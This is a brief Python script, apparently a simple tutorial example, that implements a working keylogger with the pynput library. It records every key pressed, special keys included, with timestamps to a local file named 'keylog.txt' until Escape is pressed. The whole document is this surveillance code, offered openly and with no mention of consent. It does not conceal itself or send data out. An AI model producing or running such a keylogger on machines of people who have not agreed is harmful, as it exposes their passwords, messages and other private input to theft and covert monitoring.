from pynput import keyboard
import logging

# hey!! Set up logging to log keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a function to log the keys
def on_press(key):
    try:
        # Log the key pressed
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys (like Ctrl, Alt, etc.)
        logging.info(f'Special key {key} pressed')

# Define a function to stop the listener
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if the escape key is pressed
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()